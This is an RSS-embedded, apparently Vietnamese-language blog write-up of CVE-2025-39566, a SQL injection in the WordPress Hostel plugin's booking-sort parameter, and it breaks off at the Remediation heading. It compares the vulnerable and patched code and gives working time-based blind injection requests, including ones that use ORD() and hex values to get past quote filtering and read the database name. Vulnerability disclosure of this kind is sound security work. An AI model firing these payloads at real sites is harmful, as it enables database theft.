      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;Lỗ hổng trong plugin &lt;strong&gt;Hostel&lt;/strong&gt; trước phiên bản &lt;strong&gt;1.1.5.7&lt;/strong&gt;. Do dữ liệu đầu vào không được xử lý đúng cách, điều này có thể cho phép kẻ tấn công tương tác trực tiếp với cơ sở dữ liệu, bao gồm nhưng không giới hạn ở việc đánh cắp dữ liệu.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39566&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39566&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hostel/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.5.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: 7.6 (High)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;: Plugin Hostel, dùng để quản lý đặt phòng trên WordPress, chứa lỗi SQL Injection tại tham số &lt;code&gt;ob&lt;/code&gt; trong phần &lt;strong&gt;Manage Bookings&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;background&#34;&gt;&lt;span&gt;Background&lt;/span&gt;&#xA;  &lt;a href=&#34;#background&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Hostel Plugin&lt;/strong&gt; cho phép tạo trang web nhà trọ, khách sạn nhỏ hoặc BnB bằng WordPress. Nó cung cấp:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Form đặt phòng&lt;/li&gt;&#xA;&lt;li&gt;Lịch phòng&lt;/li&gt;&#xA;&lt;li&gt;Quản lý bookings&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploitation&#34;&gt;&lt;span&gt;Exploitation&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploitation&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Hostel Plugin&lt;/strong&gt;:  v1.1.5.6(vul) và v1.1.5.7(fix)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;code-comparison&#34;&gt;&lt;span&gt;Code Comparison&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-comparison&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Sử dụng diff tool so sánh sự khác biệt giữa 2 version&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#x9;&#x9;&#x9;&#x9;&#x9;&#xA;    $orderby = &amp;#34;ORDER BY &amp;#34;.sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]) . &amp;#39; &amp;#39; . $dir;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#xA;    $ob = sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]);&#xA;    if(!in_array($ob, [&amp;#39;tB.id&amp;#39;, &amp;#39;tB.contact_name&amp;#39;, &amp;#39;tB.contact_email&amp;#39;, &amp;#39;tB.from_date&amp;#39;, &amp;#39;tB.amount_paid&amp;#39;, &amp;#39;tB.status&amp;#39;])) {&#xA;        $ob = &amp;#39;tB.id&amp;#39;;&#xA;    }&#xA;    $orderby = &amp;#34;ORDER BY $ob $dir&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Bản vá sử dụng &lt;strong&gt;whitelist&lt;/strong&gt; để giới hạn các cột có thể được sắp xếp, nếu không hợp lệ trả về &lt;code&gt;&#39;tB.id&#39;&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Analysis&lt;/strong&gt;: Lỗ hổng xuất hiện khi param &lt;code&gt;ob&lt;/code&gt; được truyền trực tiếp vào mệnh đề &lt;code&gt;ORDER BY&lt;/code&gt; thông qua hàm &lt;code&gt;sanitize_text_field()&lt;/code&gt;, chỉ escape mà không filter SQLi.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-sqli&#34;&gt;&lt;span&gt;Detect SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Để inject được, ta cần phải xác định toàn bộ câu query được được sử dụng ở đây&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$bookings = $wpdb-&amp;gt;get_results(&amp;#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM &amp;#34;.WPHOSTEL_BOOKINGS.&amp;#34; tB JOIN &amp;#34;.WPHOSTEL_ROOMS.&amp;#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cấu query nằm trong nhánh &lt;code&gt;default&lt;/code&gt; của cấu trúc &lt;code&gt;switch&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Toàn bộ đoạn xử lý naỳ thuộc về hàm static &lt;code&gt;manage()&lt;/code&gt; của class &lt;code&gt;WPHostelBookings&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class WPHostelBookings {&#xA;    static function manage() {&#xA;        global $wpdb;&#xA;        $_booking = new WPHostelBooking();&#xA;&#xA;        switch(@$_GET[&amp;#39;do&amp;#39;]) {&#xA;            case &amp;#39;add&amp;#39;: // add handle&#xA;            break;&#xA;&#xA;            case &amp;#39;edit&amp;#39;: // edit handle&#xA;            break;&#xA;&#xA;            // view/print booking details. Will allow also to confirm/cancel&#xA;            case &amp;#39;view&amp;#39;: // view handle&#x9;&#x9;&#x9;&#xA;            break;&#x9;&#x9;&#x9;&#xA;&#xA;            // list bookings&#xA;            default:&#xA;            // another logic&#xA;&#xA;            if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#x9;&#x9;&#x9;&#x9;&#x9;&#xA;                $orderby = &amp;#34;ORDER BY &amp;#34;.sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]) . &amp;#39; &amp;#39; . $dir;&#xA;            }&#xA;&#xA;            $bookings = $wpdb-&amp;gt;get_results(&amp;#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room &#xA;            FROM &amp;#34;.WPHOSTEL_BOOKINGS.&amp;#34; tB JOIN &amp;#34;.WPHOSTEL_ROOMS.&amp;#34; tR ON tR.id = tB.room_id&#xA;            WHERE is_static=0 $where_sql $orderby $limit_sql&amp;#34;);&#xA;&#xA;            // another logic&#xA;            break;&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong WordPress, plugin giao tiếp với core thông qua &lt;strong&gt;Plugin API (Hook System)&lt;/strong&gt;. Do đó, để xác định nơi hàm &lt;code&gt;manage()&lt;/code&gt; được gọi, ta có thể tìm kiếm từ khóa &lt;code&gt;&amp;quot;manage&amp;quot;&lt;/code&gt; trong thư mục chứa plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/search_manage.png&#34;&#xA;    alt=&#34;search manage()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Trong file &lt;code&gt;models/hostel.php&lt;/code&gt; ta có hàm:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class class WPHostel {&#xA;    // another logic&#xA;&#xA;    static function menu() {&#xA;        // we use &amp;#39;hostelpro_manage&amp;#39; for consistency with the pro version&#xA;        $wphostel_caps = current_user_can(&amp;#39;manage_options&amp;#39;) ? &amp;#39;manage_options&amp;#39; : &amp;#39;hostelpro_manage&amp;#39;;     &#xA;&#xA;        add_menu_page(__(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), __(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#34;wphostel_options&amp;#34;, &#xA;            array(__CLASS__, &amp;#34;options&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#39;Settings&amp;#39;, &amp;#39;wphostel&amp;#39;), __(&amp;#39;Settings&amp;#39;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#34;wphostel_options&amp;#34;, &#xA;            array(__CLASS__, &amp;#34;options&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Manage Rooms&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Manage Rooms&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_rooms&amp;#39;, array(&amp;#39;WPHostelRooms&amp;#39;, &amp;#34;manage&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_bookings&amp;#39;, array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;manage&amp;#34;)); &#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Unavailable Dates&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Unavailable Dates&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_unavailable&amp;#39;, array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;unavailable&amp;#34;)); &#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Email Log&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Email Log&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_emaillog&amp;#39;, array(&amp;#39;WPHostelHelp&amp;#39;, &amp;#34;email_log&amp;#34;));&#xA;        add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Help&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Help&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_help&amp;#39;, array(&amp;#39;WPHostelHelp&amp;#39;, &amp;#34;index&amp;#34;));     &#xA;    }&#xA;&#xA;    // another logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ở đây:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;add_menu_page()&lt;/code&gt; tạo &lt;strong&gt;menu chính&lt;/strong&gt; trong Admin Dashboard.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;add_submenu_page()&lt;/code&gt; thêm các &lt;strong&gt;submenu&lt;/strong&gt; con cho menu đó.&lt;/li&gt;&#xA;&lt;li&gt;Tham số &lt;code&gt;$callback&lt;/code&gt; là một &lt;strong&gt;callback function&lt;/strong&gt; sẽ được gọi khi người dùng click vào menu/submenu.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = &amp;#39;&amp;#39;, $icon_url = &amp;#39;&amp;#39;, $position = null);&#xA;add_menu_page(__(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), __(&amp;#39;Hostel&amp;#39;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#34;wphostel_options&amp;#34;, &#xA;    array(__CLASS__, &amp;#34;options&amp;#34;));&#xA;&#xA;// add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = &amp;#39;&amp;#39;);&#xA;add_submenu_page(&amp;#39;wphostel_options&amp;#39;, __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), __(&amp;#34;Manage Bookings&amp;#34;, &amp;#39;wphostel&amp;#39;), $wphostel_caps, &amp;#39;wphostel_bookings&amp;#39;, array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;manage&amp;#34;));&#xA;&#xA;// array(&amp;#39;WPHostelBookings&amp;#39;, &amp;#34;manage&amp;#34;)); =&amp;gt; WPHostelBookings::manage()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tất cả menu/submenu này đều được đăng ký bên trong hàm static &lt;code&gt;menu()&lt;/code&gt; của class &lt;code&gt;WPHostel&lt;/code&gt;. Do đó, để xác định nơi hàm &lt;code&gt;menu()&lt;/code&gt; được gọi, ta có thể tìm kiếm từ khóa &lt;code&gt;menu&lt;/code&gt; trong thư mục chứa plugin.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/menu_ui.png&#34;&#xA;    alt=&#34;Menu UI&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Menu UI&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Chức năng bị lỗi nằm trong &lt;strong&gt;Booking Manager&lt;/strong&gt;, vì vậy ta truy cập vào submenu &lt;code&gt;Manager Bookings&lt;/code&gt; trên UI Admin Dashboard.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Ngay trước nhánh default có comment &lt;code&gt;// list bookings&lt;/code&gt; =&amp;gt; cho thấy đoạn code này xử lý việc &lt;strong&gt;liệt kê và sắp xếp bookings&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Mở debugger:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Click &lt;kbd&gt;Run with Debugger&lt;/kbd&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Đặt &lt;strong&gt;breakpoint&lt;/strong&gt; tại &lt;strong&gt;nhánh switch chứa code lỗi&lt;/strong&gt; và &lt;strong&gt;tại dòng code gây lỗi&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Khi click vào một cột trong bảng bookings, quan sát:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Debugger nhảy vào cấu trúc &lt;code&gt;switch&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;strong&gt;Step Over&lt;/strong&gt;, debugger đi tiếp vào nhánh &lt;code&gt;default&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tiếp tục &lt;strong&gt;Step Over&lt;/strong&gt; và theo dõi giá trị biến trong tab &lt;code&gt;Variables &amp;gt; Locals&lt;/code&gt;. Các biến này sẽ kết hợp để tạo thành câu SQL bên dưới.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau khi ghép các biến, câu query đầy đủ có dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room &#xA;FROM wp_hostel_bookings tB &#xA;JOIN wp_hostel_rooms tR ON tR.id = tB.room_id &#xA;WHERE is_static=0 AND tB.id = ... &#xA;ORDER BY tB.amount_paid ASC|DESC &#xA;LIMIT ...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đáng chú ý, biến &lt;code&gt;$orderby&lt;/code&gt; được gán như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if(!empty($_GET[&amp;#39;ob&amp;#39;])) {&#x9;&#x9;&#x9;&#x9;&#x9;&#xA;    $orderby = &amp;#34;ORDER BY &amp;#34;.sanitize_text_field($_GET[&amp;#39;ob&amp;#39;]) . &amp;#39; &amp;#39; . $dir;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;⚠️ Ở đây có điểm bất thường:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Phần sau &lt;code&gt;ORDER BY&lt;/code&gt; sử dụng &lt;code&gt;sanitize_text_field()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Hàm này chỉ &lt;strong&gt;loại bỏ/escape HTML&lt;/strong&gt;, không hề filter hoặc validate để đảm bảo an toàn trong &lt;strong&gt;SQL context&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tham số &lt;code&gt;ob&lt;/code&gt; (do người dùng truyền vào) vì vậy có thể bị lợi dụng để &lt;strong&gt;chèn trực tiếp vào câu SQL&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Request with BurpSuite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=upcoming&amp;amp;ob=tB.status,(SELECT&amp;#43;SLEEP(10))&amp;amp;dir=ASC HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta tách mệnh đề &lt;code&gt;ORDER BY&lt;/code&gt; bằng &lt;code&gt;,&lt;/code&gt; vì nó chấp nhập &lt;strong&gt;multi column&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/time_response.png&#34;&#xA;    alt=&#34;time response&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Time response&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Kết quả: thời gian phản hồi bị delay =&amp;gt; SQL Injection thành công.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;dump-data-from-database&#34;&gt;&lt;span&gt;Dump Data from Database&lt;/span&gt;&#xA;  &lt;a href=&#34;#dump-data-from-database&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bypass &lt;code&gt;&#39;&lt;/code&gt; using ORD()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Để dump dữ liệu của database ta cần thử để lấy ký tự đầu tiên của &lt;strong&gt;database name&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Do &lt;code&gt;sanitize_text_field()&lt;/code&gt; loại bỏ &lt;code&gt;&#39;&lt;/code&gt;, ta không dùng được payload so sánh trực tiếp. Thay vào đó dùng &lt;code&gt;ORD()&lt;/code&gt; để so sánh ký tự theo ASCII:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=past&amp;amp;ob=tB.status,(SELECT&amp;#43;IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))&amp;amp;dir=ASC HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thành công bypass =&amp;gt; có thể trích xuất tên database.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#34;&#xA;    alt=&#34;ORD bypass&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;ORD bypass&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Bypass &lt;code&gt;&#39;&lt;/code&gt; using Hex encoding (extend)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ngoài &lt;code&gt;ORD()&lt;/code&gt; ta có thể sử dụng &lt;strong&gt;Hex encoding&lt;/strong&gt; để bypass&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=wphostel_bookings&amp;amp;type=past&amp;amp;ob=tB.status,(SELECT&amp;#43;IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))&amp;amp;dir=ASC HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thành công bypass =&amp;gt; có thể trích xuất tên database.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-21-cve-2025-39566/ord_bypass.png&#34;&#xA;    alt=&#34;Hex encoding bypass&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Hex encoding bypass&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;remediation&#34;&gt;&lt;span&gt;Remediation&lt;/span&gt;&#xA;  &lt;a href=&#34;#remediation&#34; 